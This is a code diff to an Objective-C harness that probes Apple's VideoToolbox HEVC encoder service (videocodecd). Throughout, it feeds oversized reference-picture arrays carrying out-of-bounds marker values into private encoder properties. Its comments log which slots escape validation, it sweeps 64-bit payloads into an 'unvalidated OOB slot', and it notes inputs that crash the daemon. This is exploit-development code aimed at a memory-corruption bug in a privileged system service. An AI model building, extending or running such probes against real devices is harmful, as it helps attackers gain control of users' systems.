@@ -179,10 +179,17 @@ static void Stage6OutputCallback(void *outputCallbackRefCon,
     // Real SampleAttachments (array of dicts - CMCopyDictionaryOfAttachments is empty)
     CFArrayRef saArray = CMSampleBufferGetSampleAttachmentsArray(sampleBuffer, false);
     NSUInteger saKeys = 0;
+    NSString *saDump = @"";
     if (saArray && CFArrayGetCount(saArray) > 0) {
         CFDictionaryRef dict = (CFDictionaryRef)CFArrayGetValueAtIndex(saArray, 0);
         if (dict && CFGetTypeID(dict) == CFDictionaryGetTypeID()) {
             saKeys = CFDictionaryGetCount(dict);
+            NSDictionary *nsDict = (__bridge NSDictionary *)dict;
+            NSMutableArray *kvParts = [NSMutableArray array];
+            for (id k in nsDict) {
+                [kvParts addObject:[NSString stringWithFormat:@"%@=%@", k, nsDict[k]]];
+            }
+            saDump = [kvParts componentsJoinedByString:@","];
         }
     }
     // VPS/SPS/PPS from CMFormatDescription (serialized inside VTEncoderXPCService)
@@ -213,9 +220,9 @@ static void Stage6OutputCallback(void *outputCallbackRefCon,
         res->cbCount++;
         res->lastStatus = status;
         snprintf(res->summary, sizeof(res->summary),
-                 "cb#%d st=%d info=0x%x saKeys=%lu ps=%zu sps=%s nal(%zu)=%s",
+                 "cb#%d st=%d info=0x%x saKeys=%lu{%s} ps=%zu sps=%s nal(%zu)=%s",
                  res->cbCount, (int)status, (unsigned)infoFlags,
-                 (unsigned long)saKeys, paramCount,
+                 (unsigned long)saKeys, [saDump UTF8String], paramCount,
                  [spsHex UTF8String], totalLen, [nalHex UTF8String]);
         if (res->cbCount == 1) snprintf(res->first, sizeof(res->first), "%s", res->summary);
     }
@@ -407,104 +414,95 @@ static void Stage7RunCustomDPBArray(NSMutableString *log,
 }
 
 static void RunStage7_MalfunctionMatrix(NSMutableString *log) {
-    KPH9OutAppend(log, @"\n--- Stage 7: Split-Zero x35 OOB DPB + Post-IDR DPB + Flat CFNumber UserRPS ---\n");
+    KPH9OutAppend(log, @"\n--- Stage 7: Exact x35 Slot[32..34] OOB Isolation + Post-IDR DPB + Safe Dict UserRPS ---\n");
     CVPixelBufferRef px = CreateDummyNV12Buffer(192, 144);
     if (!px) {
         KPH9OutAppend(log, @"  [!] Failed to allocate CVPixelBuffer\n");
         return;
     }
 
-    // 7A: Exact max count is x35 (x36 -> -12900).
-    // Uniform val=0 passed validation (st=0), and x1 with slot[0]=0x4141414141410000 passed (st=0),
-    // while non-zero in slots[1..15] failed with -17691.
-    // Test split arrays of length 35 where in-bounds slots are 0 and OOB slots carry 0x4141414141410000.
-    KPH9OutAppend(log, @"  [7A: x35 split-zero vs OOB-tagged arrays (RealTime + P-frame flush)]\n");
+    // 7A: Previous run proved:
+    //   - x35 [0..31=0, 32..34=tag] -> prep=-17691
+    //   - x35 [0..33=0, 34=tag]     -> prep=0, enc=0/0, cb#1 st=0, cb#2 st=0!
+    // Isolate every single tail slot (31, 32, 33, 34) and sweep 64-bit payloads in unvalidated slot[34].
+    KPH9OutAppend(log, @"  [7A: Single-slot isolation for x35 tail indices 31..34 @pre]\n");
     long long tagBase = 0x4141414141410000LL;
 
-    // Case 1: x35 all zeros (pre-Prepare)
+    int singleSlots[] = { 0, 15, 16, 31, 32, 33, 34 };
+    for (size_t si = 0; si < sizeof(singleSlots) / sizeof(singleSlots[0]); si++) {
+        int targetSlot = singleSlots[si];
+        NSMutableArray *arr = [NSMutableArray arrayWithCapacity:35];
+        for (int k = 0; k < 35; k++) {
+            [arr addObject:(k == targetSlot) ? @(tagBase | k) : @0];
+        }
+        NSString *lbl = [NSString stringWithFormat:@"x35 only-slot[%02d]=tag@pre", targetSlot];
+        Stage7RunCustomDPBArray(log, px, lbl, arr, 0);
+    }
+
+    // Pair isolation: slots[33..34]=tag vs slots[32..33]=tag
+    NSMutableArray *a35_33_34 = [NSMutableArray arrayWithCapacity:35];
+    NSMutableArray *a35_32_33 = [NSMutableArray arrayWithCapacity:35];
+    for (int k = 0; k < 35; k++) {
+        [a35_33_34 addObject:(k >= 33) ? @(tagBase | k) : @0];
+        [a35_32_33 addObject:(k == 32 || k == 33) ? @(tagBase | k) : @0];
+    }
+    Stage7RunCustomDPBArray(log, px, @"x35 slots[32..33]=tag@pre", a35_32_33, 0);
+    Stage7RunCustomDPBArray(log, px, @"x35 slots[33..34]=tag@pre", a35_33_34, 0);
+
+    // Payload sweep on the unvalidated 35th element (slot[34]) @pre
+    KPH9OutAppend(log, @"  [7B: Payload sweep on unvalidated OOB slot[34] (35th element) @pre]\n");
+    uint64_t slot34Payloads[] = {
+        0x0000000000000001ULL,
+        0x00000000000000ffULL,
+        0x0000000100000001ULL,
+        0x0000002000000020ULL,
+        0x7fffffffffffffffULL,
+        0x8000000000000000ULL,
+        0xffffffff00000000ULL,
+        0xffffffffffffffffULL,
+    };
+    for (size_t pi = 0; pi < sizeof(slot34Payloads) / sizeof(slot34Payloads[0]); pi++) {
+        int64_t val = (int64_t)slot34Payloads[pi];
+        NSMutableArray *arr = [NSMutableArray arrayWithCapacity:35];
+        for (int k = 0; k < 34; k++) [arr addObject:@0];
+        CFNumberRef num = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt64Type, &val);
+        [arr addObject:(__bridge_transfer id)num];
+        NSString *lbl = [NSString stringWithFormat:@"x35 slot[34]=0x%016llx@pre", (unsigned long long)slot34Payloads[pi]];
+        Stage7RunCustomDPBArray(log, px, lbl, arr, 0);
+    }
+
+    // 7C: Post-IDR injection (timingMode=1 after Prepare vs timingMode=2 after IDR)
+    KPH9OutAppend(log, @"  [7C: x35 @postPrepare (mode=1) vs @postIDR (mode=2) with SampleAttachments dump]\n");
     NSMutableArray *a35Zero = [NSMutableArray arrayWithCapacity:35];
-    for (int k = 0; k < 35; k++) [a35Zero addObject:@0];
-    Stage7RunCustomDPBArray(log, px, @"x35 all-zero@pre", a35Zero, 0);
-
-    // Case 2: x35 slot[0]=tagged, slots[1..34]=0 (since x1 slot[0]=tagged gave st=0!)
     NSMutableArray *a35HeadTag = [NSMutableArray arrayWithCapacity:35];
-    [a35HeadTag addObject:@(tagBase)];
-    for (int k = 1; k < 35; k++) [a35HeadTag addObject:@0];
-    Stage7RunCustomDPBArray(log, px, @"x35 slot0=tag,1..34=0@pre", a35HeadTag, 0);
-
-    // Case 3: x35 slots[0..15]=0 (valid 16-entry DPB), OOB slots[16..34]=tagged
     NSMutableArray *a35OOB16 = [NSMutableArray arrayWithCapacity:35];
-    for (int k = 0; k < 35; k++) [a35OOB16 addObject:(k < 16) ? @0 : @(tagBase | k)];
-    Stage7RunCustomDPBArray(log, px, @"x35 0..15=0,16..34=tag@pre", a35OOB16, 0);
-
-    // Case 4: x35 slots[0..31]=0, tail slots[32..34]=tagged
-    NSMutableArray *a35OOB32 = [NSMutableArray arrayWithCapacity:35];
-    for (int k = 0; k < 35; k++) [a35OOB32 addObject:(k < 32) ? @0 : @(tagBase | k)];
-    Stage7RunCustomDPBArray(log, px, @"x35 0..31=0,32..34=tag@pre", a35OOB32, 0);
-
-    // Case 5: x35 slots[0..33]=0, only final slot[34] (35th element) = tagged
     NSMutableArray *a35LastTag = [NSMutableArray arrayWithCapacity:35];
-    for (int k = 0; k < 34; k++) [a35LastTag addObject:@0];
-    [a35LastTag addObject:@(tagBase | 34)];
-    Stage7RunCustomDPBArray(log, px, @"x35 0..33=0,34=tag@pre", a35LastTag, 0);
-
-    // 7B: Post-IDR injection (encode IDR pts=0 first so frame 0 is in DPB, then inject x35 for P-frame pts=1)
-    KPH9OutAppend(log, @"  [7B: x35 injected AFTER clean IDR (pts=0 in DPB before P-frame pts=1)]\n");
+    NSMutableArray *a35FullTag = [NSMutableArray arrayWithCapacity:35];
+    for (int k = 0; k < 35; k++) {
+        [a35Zero addObject:@0];
+        [a35HeadTag addObject:(k == 0) ? @(tagBase) : @0];
+        [a35OOB16 addObject:(k < 16) ? @0 : @(tagBase | k)];
+        [a35LastTag addObject:(k == 34) ? @(tagBase | 34) : @0];
+        [a35FullTag addObject:@(tagBase | k)];
+    }
+    Stage7RunCustomDPBArray(log, px, @"x35 all-tag@postPrep", a35FullTag, 1);
     Stage7RunCustomDPBArray(log, px, @"x35 all-zero@postIDR", a35Zero, 2);
     Stage7RunCustomDPBArray(log, px, @"x35 slot0=tag,1..34=0@postIDR", a35HeadTag, 2);
     Stage7RunCustomDPBArray(log, px, @"x35 0..15=0,16..34=tag@postIDR", a35OOB16, 2);
     Stage7RunCustomDPBArray(log, px, @"x35 0..33=0,34=tag@postIDR", a35LastTag, 2);
-    NSMutableArray *a35FullTag = [NSMutableArray arrayWithCapacity:35];
-    for (int k = 0; k < 35; k++) [a35FullTag addObject:@(tagBase | k)];
     Stage7RunCustomDPBArray(log, px, @"x35 all-tag@postIDR", a35FullTag, 2);
 
-    // 7C: Flat CFNumber UserRPSForFaceTime ladder!
-    // Previous run proved: wrapped @[dict] had frameEncode=0 (ignored), whereas
-    // flat CFArray of CFNumbers caused frameEncode=-12912 (actually parsed by H9!).
-    // Sweep flat CFNumber arrays across counts and payloads (pre-Prepare vs post-IDR).
-    KPH9OutAppend(log, @"  [7C: Flat CFNumber UserRPSForFaceTime count & payload sweep]\n");
-    int rpsCounts[] = { 1, 2, 4, 6, 8, 16, 17, 32, 34, 35, 36, 64 };
-    for (size_t ri = 0; ri < sizeof(rpsCounts) / sizeof(rpsCounts[0]); ri++) {
-        int rc = rpsCounts[ri];
-        NSMutableArray *flatZero = [NSMutableArray arrayWithCapacity:(NSUInteger)rc];
-        for (int k = 0; k < rc; k++) [flatZero addObject:@0];
-
-        Stage6ProbeResult *res = Stage6AllocResult();
-        if (!res) continue;
-        VTCompressionSessionRef session = NULL;
-        NSDictionary *spec = @{ @"EnableUserRefForFacetime": @YES };
-        OSStatus st = VTCompressionSessionCreate(
-            kCFAllocatorDefault, 192, 144, kCMVideoCodecType_HEVC,
-            (__bridge CFDictionaryRef)spec, NULL, NULL, Stage6OutputCallback, res, &session);
-        if (st != noErr || !session) {
-            free(res);
-            continue;
-        }
-        VTSessionSetProperty(session, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
-        KPH9PrimeRealTime(session);
-        OSStatus setPre = VTSessionSetProperty(session, CFSTR("UserRPSForFaceTime"),
-                                               (__bridge CFTypeRef)flatZero);
-        OSStatus prepSt = VTCompressionSessionPrepareToEncodeFrames(session);
-        OSStatus setPost = VTSessionSetProperty(session, CFSTR("UserRPSForFaceTime"),
-                                                (__bridge CFTypeRef)flatZero);
-        OSStatus e0 = -1, e1 = -1;
-        KPH9EncodeAndFlushTwoCallbacks(session, px, NULL, res, &e0, &e1);
-        @synchronized ([KPH9EncoderModule class]) {
-            res->closed = 1;
-            KPH9OutAppend(log, @"  rps[flat0 x%-2d] pre=%d prep=%d post=%d enc=%d/%d cbs=%d | first: %s | last: %s\n",
-                          rc, (int)setPre, (int)prepSt, (int)setPost, (int)e0, (int)e1,
-                          res->cbCount, res->first, res->summary);
-        }
-        KPH9SafeTeardownEx(session, NULL, res);
-    }
-
-    // Also test flat CFNumber UserRPS injected AFTER clean IDR (pts=0) so reference frame 0 exists
-    int postIdrCounts[] = { 1, 4, 16, 32, 35, 64 };
-    for (size_t ri = 0; ri < sizeof(postIdrCounts) / sizeof(postIdrCounts[0]); ri++) {
-        int rc = postIdrCounts[ri];
-        NSMutableArray *flatZero = [NSMutableArray arrayWithCapacity:(NSUInteger)rc];
-        for (int k = 0; k < rc; k++) [flatZero addObject:@0];
-
+    // 7D: Safe NSDictionary-only UserRPSForFaceTime probe
+    // NOTE: Flat CFNumber elements in UserRPSForFaceTime crash videocodecd (SIGABRT on non-dict element)
+    // and trigger launchd's 4-crash throttle! Only NSDictionary elements keep videocodecd alive.
+    KPH9OutAppend(log, @"  [7D: Safe NSDictionary UserRPSForFaceTime schema & frameProps probe]\n");
+    NSArray<NSDictionary *> *rpsSchemas = @[
+        @{ @"NumNegativePics": @1, @"NumPositivePics": @0, @"DeltaPocS0Minus1": @[@0], @"UsedByCurrPicS0": @[@1] },
+        @{ @"NumNegativePics": @1, @"NumPositivePics": @0, @"AbsDeltaRPSMinus1": @[@0], @"DeltaRPSSign": @[@0], @"UsedByCurrPicS0": @1 },
+        @{ @"NumShortTermRefPicSets": @1, @"NumDeltaPocs": @1, @"DeltaPocS0": @[@(-1)], @"UsedByCurrPicS0": @[@1] },
+    ];
+    for (size_t ri = 0; ri < rpsSchemas.count; ri++) {
+        NSDictionary *rpsDict = rpsSchemas[ri];
         Stage6ProbeResult *res = Stage6AllocResult();
         if (!res) continue;
         VTCompressionSessionRef session = NULL;
@@ -520,10 +518,11 @@ static void RunStage7_MalfunctionMatrix(NSMutableString *log) {
         VTCompressionSessionPrepareToEncodeFrames(session);
         OSStatus e0 = VTCompressionSessionEncodeFrame(session, px, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
         int w0 = 0;
-        while (res->cbCount < 1 && w0 < 60) { usleep(2000); w0 += 2; }
-        OSStatus setAfterIDR = VTSessionSetProperty(session, CFSTR("UserRPSForFaceTime"),
-                                                    (__bridge CFTypeRef)flatZero);
-        OSStatus e1 = VTCompressionSessionEncodeFrame(session, px, CMTimeMake(1, 30), kCMTimeInvalid, NULL, NULL, NULL);
+        while (res->cbCount < 1 && w0 < 80) { usleep(2000); w0 += 2; }
+        OSStatus setDictArr = VTSessionSetProperty(session, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)@[rpsDict]);
+        NSDictionary *fp = @{ @"UserRPSForFaceTime": @[rpsDict] };
+        OSStatus e1 = VTCompressionSessionEncodeFrame(session, px, CMTimeMake(1, 30), kCMTimeInvalid,
+                                                      (__bridge CFDictionaryRef)fp, NULL, NULL);
         for (int pts = 2; pts <= 5 && res->cbCount < 2; pts++) {
             VTCompressionSessionEncodeFrame(session, px, CMTimeMake(pts, 30), kCMTimeInvalid, NULL, NULL, NULL);
             int sw = 0;
@@ -531,8 +530,8 @@ static void RunStage7_MalfunctionMatrix(NSMutableString *log) {
         }
         @synchronized ([KPH9EncoderModule class]) {
             res->closed = 1;
-            KPH9OutAppend(log, @"  rps[postIDR flat0 x%-2d] set=%d enc=%d/%d cbs=%d | first: %s | last: %s\n",
-                          rc, (int)setAfterIDR, (int)e0, (int)e1, res->cbCount, res->first, res->summary);
+            KPH9OutAppend(log, @"  rps[dictSchema#%zu] set=%d enc=%d/%d cbs=%d | first: %s | last: %s\n",
+                          ri, (int)setDictArr, (int)e0, (int)e1, res->cbCount, res->first, res->summary);
         }
         KPH9SafeTeardownEx(session, NULL, res);
     }
